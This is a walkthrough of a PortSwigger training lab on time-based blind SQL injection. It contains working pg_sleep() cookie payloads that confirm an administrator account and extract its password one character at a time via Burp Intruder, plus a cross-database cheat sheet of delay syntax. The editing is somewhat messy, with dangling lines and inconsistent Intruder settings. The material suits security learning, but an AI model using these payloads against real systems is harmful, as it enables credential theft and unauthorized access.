# 🎯 Objective

The objective of this lab is to **identify and exploit a time-based blind SQL injection vulnerability** in the `TrackingId` cookie by using conditional database delays.

Specifically, the lab aims to:

1. Confirm that the `TrackingId` cookie is vulnerable to SQL injection.
2. Use `pg_sleep()` to create a measurable time delay when a SQL condition is **TRUE**.
3. Establish a **TRUE/FALSE timing oracle**:

   * **TRUE → approximately 10-second delay**
   * **FALSE → normal response time**
4. Confirm that the `administrator` user exists in the `users` table.
5. Determine the length of the administrator's password by testing different lengths.
6. Extract the password **one character at a time** using `SUBSTRING()`.
7. Use **Burp Suite Repeater** for individual tests and **Burp Intruder** to automate character testing.
8. Reconstruct the administrator's password from the timing differences and use it to complete the authorized PortSwigger lab.



# Step 1: Intercept the Request

Open **Burp Suite**.

Turn **Intercept ON**.

Visit the shop homepage.

Capture a request similar to:

```
GET / HTTP/2
Host: lab-id.web-security-academy.net
Cookie: TrackingId=x; session=...
```

Send it to **Repeater**.

---

# Step 2: Test a True Condition

Replace the cookie value with:

```
**TrackingId=x'||pg_sleep(10)--**
```

---

Modify the cookie to:


# Step 3 — Test TRUE

Your encoded cookie:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Decoded:

```sql
TrackingId=x';SELECT CASE
WHEN (1=1)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END--
```

The database evaluates:

```sql
1=1
```

Result:

```text
TRUE
```

Therefore:

```sql
pg_sleep(10)
```

runs.

You should see approximately:

```text
Normal response: ~200-500 ms
TRUE condition:  ~10,000 ms
```

The exact normal time varies.

---

or

```
TrackingId=x' ||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

# The core idea

Normally, the application might execute something conceptually like:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid = 'x'
```

You don't get the SQL result directly.

Instead, you observe the **HTTP response time**.

So you create a rule:

```text
TRUE condition
     ↓
pg_sleep(10)
     ↓
HTTP response ≈ 10 seconds

FALSE condition
     ↓
pg_sleep(0)
     ↓
HTTP response ≈ normal response time
```

That gives you:

```text
10 seconds  → TRUE
~normal     → FALSE
```

This is the **timing oracle**.

---

# Why is `%3B` used?

Your payload starts with:

```text
x'%3BSELECT
```

`%3B` is URL encoding for:

```text
;
```

After decoding, the database effectively receives:

```sql
x';SELECT ...
```

The semicolon is important because it **terminates the original SQL statement and starts another SQL statement**.

Conceptually:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid='x';
```

Then:

```sql
SELECT CASE ...
```

So:

```text
Original SQL statement
        │
        │ ;
        ▼
Injected SQL statement
```

That's why the semicolon is there.

---

# Why use `SELECT CASE`?

Your injected statement is:

```sql
SELECT CASE
    WHEN (1=1)
    THEN pg_sleep(10)
    ELSE pg_sleep(0)
END
```

The structure is:

```sql
CASE
    WHEN condition
    THEN action_if_true
    ELSE action_if_false
END
```

Therefore:

```sql
1=1
```

is TRUE:

```text
TRUE
 ↓
pg_sleep(10)
 ↓
10-second delay
```

Whereas:

```sql
1=2
```

is FALSE:

```text
FALSE
 ↓
pg_sleep(0)
 ↓
no meaningful delay
```

---

# Step 4 — Test FALSE

Now:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Decoded:

```sql
SELECT CASE
WHEN (1=2)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END
```

Because:

```sql
1=2
```

is FALSE:

```text
FALSE
 ↓
pg_sleep(0)
 ↓
normal response
```

Now you have demonstrated:

```text
Condition TRUE  → ~10 seconds
Condition FALSE → normal response
```

That's the foundation of the attack.

---

# Step 5 — Test whether administrator exists

Now replace the simple condition:

```sql
1=1
```

with:

```sql
username='administrator'
```

Payload:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded:

```sql
SELECT CASE
WHEN (username='administrator')
THEN pg_sleep(10)
ELSE pg_sleep(0)
END
FROM users
```

Imagine:

```text
users

username
----------------
administrator
carlos
wiener
```

For the administrator row:

```sql
username='administrator'
```

is TRUE.

Therefore:

```sql
pg_sleep(10)
```

runs.

So:

```text
~10 seconds
    ↓
administrator exists
```

---

# Step 6 — Test password length

Now the condition becomes:

```sql
username='administrator'
AND LENGTH(password)>1
```

Full encoded payload:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Conceptually:

```sql
SELECT CASE
WHEN (
    username='administrator'
    AND LENGTH(password)>1
)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END
FROM users
```

Suppose the password has 20 characters.

Then:

```sql
LENGTH(password)>1
```

is TRUE.

Therefore:

```text
~10 seconds
```

---
# Step 7- Use Burp Intruder
Testing every character manually would be slow.

Instead:

Send the request to Intruder.
Highlight only the test character (for example, the final 1).
Click Add §.
Attack Type: Sniper

You get:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The §...§ markers tell Intruder where to insert payloads.

# Step 8: Configure Payloads
Choose Payload type: Numbers

Add:

```
0
1
2
...
9
```
This covers digits.

Number Range: from- 1 to 25 & Step 1


# Step 9: Recover the Password

Now test the first character.

Payload:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

## 

---

# Step 10: Automate with Burp Intruder

Testing 36 possibilities manually is slow.

Send the request to **Intruder**.

Mark only the character:

```
§a§
```

The payload becomes:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

# Step 11: Configure Payloads

Choose:

```
Payload: Brute Force (Max Length 1 & Min 1)
```

Add:

```
a
b
c
...
z
0
1
2
...
9
```

---


# How to recognize the correct character

Suppose Intruder produces:

| Payload | Response received |
| ------- | ----------------: |
| a       |            280 ms |
| b       |            315 ms |
| c       |            290 ms |
| d       |            301 ms |
| e       |            275 ms |
| ...     |               ... |
| m       |     **10,180 ms** |
| n       |            290 ms |
| ...     |               ... |

The important row is:

```text
m → ~10,000 ms
```

Therefore:

```text
Position 1 = m
```

The reason is:

```sql
SUBSTRING(password,1,1)='m'
```

was TRUE.

---

# Move to position 2

Change:

```sql
SUBSTRING(password,1,1)
```

to:

```sql
SUBSTRING(password,2,1)
```

Now you're asking:

> Is the second character `a`?

Then `b`, `c`, etc.

Suppose:

```text
7 → 10,100 ms
```

Then:

```text
Position 2 = 7
```

---

# Continue

You repeat:

```text
SUBSTRING(password,1,1)
SUBSTRING(password,2,1)
SUBSTRING(password,3,1)
SUBSTRING(password,4,1)
...
SUBSTRING(password,20,1)
```

Eventually:

```text
Position 1 → m
Position 2 → 7
Position 3 → k
Position 4 → 9
...
Position 20 → ?
```

You reconstruct the password one character at a time.

---


### The most important concept

You aren't **seeing the password** in the HTTP response.

Instead, you're repeatedly asking the database questions like:

> **"Is the first character `m`?"**

and interpreting:

```text
10 seconds → YES
normal time → NO
```

Then:

> **"Is the second character `7`?"**

and so on.

That's why this is called **time-based blind SQL injection**: the database's actual result remains hidden, but its **execution time leaks information**.

## ⏱️ Conditional Time Delays

| Database                 | Conditional time-delay syntax                                                                                    |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| **Oracle**               | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **Microsoft SQL Server** | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| **PostgreSQL**           | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| **MySQL**                | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

